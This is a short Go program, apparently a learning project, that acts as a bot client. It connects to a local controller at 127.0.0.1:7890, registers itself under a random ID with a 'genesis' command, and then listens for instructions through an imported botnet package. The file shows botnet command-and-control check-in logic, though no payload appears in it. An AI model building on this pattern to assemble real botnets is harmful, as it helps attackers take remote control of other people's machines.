package main

import (
	"bytes"
	"fmt"
	"io"
	"log"
	"net"
	"strings"

	"github.com/rodzzlessa24/botnet"
	"github.com/satori/go.uuid"
)

const commandLength = 12

func commandToBytes(command string) []byte {
	var bytes [commandLength]byte

	for i, c := range command {
		bytes[i] = byte(c)
	}

	return bytes[:]
}

func bytesToCommand(bytes []byte) string {
	var command []byte

	for _, b := range bytes {
		if b != 0x0 {
			command = append(command, b)
		}
	}

	return fmt.Sprintf("%s", command)
}

func main() {
	sendData("127.0.0.1:7890")
}

func sendData(addr string) {
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		fmt.Printf("%s is not available\n", addr)
		return
	}

	bot := &botnet.Bot{
		ID:   uuid.NewV4().Bytes(),
		Host: strings.Split(conn.LocalAddr().String(), ":")[0],
		Port: strings.Split(conn.LocalAddr().String(), ":")[1],
	}

	buff, err := bot.Bytes()
	if err != nil {
		log.Panic(err)
	}

	data := append(commandToBytes("genesis"), buff...)

	_, err = io.Copy(conn, bytes.NewReader(data))
	if err != nil {
		log.Panic(err)
	}

	conn.Close()

	bot.Listen()
}
